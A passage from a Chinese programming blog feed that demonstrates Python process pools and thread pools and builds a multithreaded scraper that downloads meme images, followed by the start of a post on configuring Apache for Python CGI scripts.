<h4 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h4><blockquote>
<p>进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的</p>
</blockquote>
<ul>
<li>通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = multiprocessing.Pool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167366.44.png" alt></p>
<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><blockquote>
<p>线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">'msg:'</span>,msg)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func_return: %s'</span> % msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#apply_async</span></span><br><span class="line">    print(<span class="string">'\n------apply_async--------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg = <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply_async(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply_async:不阻塞'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        i.wait()     <span class="comment">#等待进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> i.ready():            <span class="comment">#判断进程函数是否已经启动了</span></span><br><span class="line">            <span class="keyword">if</span> i.successful():   <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">                print(i.get())   <span class="comment">#输出进程函数的返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#apply</span></span><br><span class="line">    print(<span class="string">'\n----------apply---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">4</span>)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        msg =  <span class="string">'hello fsdfs %d'</span> % i</span><br><span class="line">        result = pool.apply(func,(msg,))</span><br><span class="line">        results.append(result)</span><br><span class="line">    print(<span class="string">'apply:阻塞'</span>)           <span class="comment">#执行完func才可以执行该语句</span></span><br><span class="line">    <span class="comment"># pool.close()</span></span><br><span class="line">    <span class="comment"># pool.join()</span></span><br><span class="line">    print(results)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map</span></span><br><span class="line">    print(<span class="string">'\n---------map-----------'</span>)</span><br><span class="line">    args = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    return_data = pool.map(func,args)</span><br><span class="line">    print(<span class="string">'map:阻塞'</span>) <span class="comment">#执行完func才执行该语句</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line">    print(return_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#map_async</span></span><br><span class="line">    print(<span class="string">'\n-------map_async---------'</span>)</span><br><span class="line">    pool = ThreadPool(processes=<span class="number">5</span>)</span><br><span class="line">    result = pool.map_async(func,args)</span><br><span class="line">    print(<span class="string">'ready:'</span>,result.ready())</span><br><span class="line">    print(<span class="string">'不阻塞'</span>)</span><br><span class="line">    result.wait()  <span class="comment">#等待所有进程函数执行完毕</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result.ready():           <span class="comment">#判断进程函是否已经启动了</span></span><br><span class="line">        <span class="keyword">if</span> result.successful():  <span class="comment">#判断进程函数是否执行成功</span></span><br><span class="line">            print(result.get())  <span class="comment">#输出进程函数的返回值</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530167991.95.png" alt></p>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><blockquote>
<p>通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况</p>
</blockquote>
<h3 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h3><blockquote>
<p>学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(<a href="https://www.doutula.com" target="_blank" rel="noopener">https://www.doutula.com</a>)</p>
</blockquote>
<ul>
<li><p>分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：<a href="https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)" target="_blank" rel="noopener">https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png)</a></p>
</li>
<li><p>当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。</p>
</li>
<li><p>分析一下图片的连接：该网站使用新浪的图床<code>ws1.sinaimg.cn</code>,多查看几个图片地址发现不一定是<code>ws1</code>子域名 ，可能是是任何<code>ws</code>开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接）</p>
</li>
<li><p>经过测试，网站没有做反爬，接下来就简单了，步骤如下：</p>
<ul>
<li>获取单个页面用正则匹配img标签的图片地址和图片描述</li>
<li>将获取到的表情包下载保存</li>
<li>改变page参数爬取所有的列表页面</li>
</ul>
</li>
<li><p>当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信</p>
</li>
<li><p>代码实现：</p>
<ul>
<li><p>设置图片保存的文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建两个线程池，分别用于图片任务和页面任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>用正则去匹配图片信息，并将获取到的图片链接和描述入队</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="comment">#将图片的后缀加到name中，方便后面的保存</span></span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取页面的源码（尽管没有限制，但还是加上UA头和cookie）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br></pre></td></tr></table></figure>
</li>
<li><p>保存表情包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br></pre></td></tr></table></figure>
</li>
<li><p>主函数（启动线程池，队列等）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ef main():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br></pre></td></tr></table></figure>
</li>
<li><p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空</span></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#用正则去匹配图片信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern = re.compile(<span class="string">'data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;'</span>,re.S)</span><br><span class="line">    img_list = re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> url, name <span class="keyword">in</span> img_list:</span><br><span class="line">        name = name + url[<span class="number">-4</span>:]</span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line">    <span class="comment"># get_page()</span></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行结果：</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183677.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530183691.54.png" alt></p>
</li>
</ul>
</li>
<li><p>以上是通过正则表达式来做的，下面稍加修改，用解析库来做：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.join(os.path.dirname(__file__) + <span class="string">'/pic'</span>)</span><br><span class="line"><span class="comment"># print(BASE_DIR)</span></span><br><span class="line"><span class="comment">#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信</span></span><br><span class="line">picqueue = multiprocessing.Queue()</span><br><span class="line">pagequeue = multiprocessing.Queue()</span><br><span class="line">logqueue = multiprocessing.Queue()</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建两个线程池，分别用于图片任务和页面任务</span></span><br><span class="line">picpool  = ThreadPool(<span class="number">30</span>)</span><br><span class="line">pagepool = ThreadPool(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">error = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_imglist</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">    img_list = soup.find_all(<span class="string">'a'</span>,class_=<span class="string">'col-xs-6 col-sm-3'</span>)</span><br><span class="line">    <span class="comment"># print(img_list)</span></span><br><span class="line">    <span class="keyword">for</span> imgs <span class="keyword">in</span> img_list:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = imgs.find(<span class="string">'img'</span>)[<span class="string">'data-original'</span>]</span><br><span class="line">            name = imgs.find(<span class="string">'p'</span>,style=<span class="string">'display: none'</span>).text + url[<span class="number">-4</span>:]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        logqueue.put(url)</span><br><span class="line">        picqueue.put((name,url))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#进行会话的保持</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>:<span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>线程池</tag>
        <tag>进程池</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python CGI编程</title>
    <url>/2018/06/17/python-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="python-CGI编程"><a href="#python-CGI编程" class="headerlink" title="python CGI编程"></a>python CGI编程</h2><p>###什么是CGI</p>
<blockquote>
<p>CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。</p>
</blockquote>
<h3 id="网页浏览"><a href="#网页浏览" class="headerlink" title="网页浏览"></a>网页浏览</h3><blockquote>
<p>通过在网页上点击一个链接或URL的流程了解CGI是如何工作的</p>
</blockquote>
<ol>
<li>使用浏览器访问URL连接到HTTP web 服务器</li>
<li>web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息</li>
<li>CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等</li>
</ol>
<h3 id="CGI架构图及其本地环境配置"><a href="#CGI架构图及其本地环境配置" class="headerlink" title="CGI架构图及其本地环境配置"></a>CGI架构图及其本地环境配置</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529201542.26.png" alt></p>
<ul>
<li><p>采用PHPstudy+windows测试，修改httpd.conf配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查找一下自己的DocumentRoot </span><br><span class="line">DocumentRoot  &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;</span><br><span class="line"></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    Order allow,deny  </span><br><span class="line">    Allow from all  </span><br><span class="line">    #Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#让apache识别py文件为cgi程序：</span><br><span class="line">AddHandler cgi-script .cgi .py </span><br><span class="line"></span><br><span class="line">只允许在特别目录下执行cgi程序:</span><br><span class="line">ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试实例（python不用指定编码，测试了时候指定编码出现乱码）</p>
